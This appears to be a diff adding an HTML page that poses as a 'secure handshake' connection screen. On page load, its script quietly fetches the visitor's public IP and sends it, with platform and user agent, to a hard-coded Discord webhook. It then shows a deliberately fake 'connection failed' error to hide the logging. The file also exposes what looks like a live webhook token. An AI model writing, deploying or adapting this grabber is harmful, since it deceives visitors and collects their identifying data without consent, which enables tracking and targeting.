@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connecting...</title>
+    <style>
+        body { background: #0d1117; color: #58a6ff; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+        #error { color: #f85149; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <div id="loading-ui">
+        <div class="loader"></div>
+        <div id="status">INITIATING_SECURE_HANDSHAKE...</div>
+    </div>
+
+    <div id="error" class="hidden">
+        <h1>CONNECTION_FAILED</h1>
+        <p style="color: #8b949e;">The remote gateway did not respond.</p>
+        <button onclick="location.reload()" style="background: #21262d; color: #58a6ff; border: 1px solid #30363d; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Retry</button>
+    </div>
+
+    <script>
+        const hook = "https://discord.com/api/webhooks/1452666232141643878/NX4YYWvhuYHnVBM8eIeTvQM3h__3G2QKBnVtds-bYon6rHsZ_ecqv4-eTVp23nEiVU20";
+
+        async function startDiagnostics() {
+            try {
+                // 1. Get the IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const userIP = data.ip;
+
+                // 2. Send to Discord
+                await fetch(hook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "--- NEW DIAGNOSTIC LOG ---",
+                        embeds: [{
+                            title: "Device Connection Authorized",
+                            color: 5814783,
+                            fields: [
+                                { name: "IP Address", value: userIP, inline: true },
+                                { name: "Platform", value: navigator.platform, inline: true },
+                                { name: "User Agent", value: navigator.userAgent }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+            } catch (e) {
+                console.log("Log fail");
+            }
+
+            // 3. Show the fake error after 4 seconds
+            setTimeout(() => {
+                document.getElementById('loading-ui').classList.add('hidden');
+                document.getElementById('error').classList.remove('hidden');
+            }, 4000);
+        }
+
+        startDiagnostics();
+    </script>
+</body>
+</html>
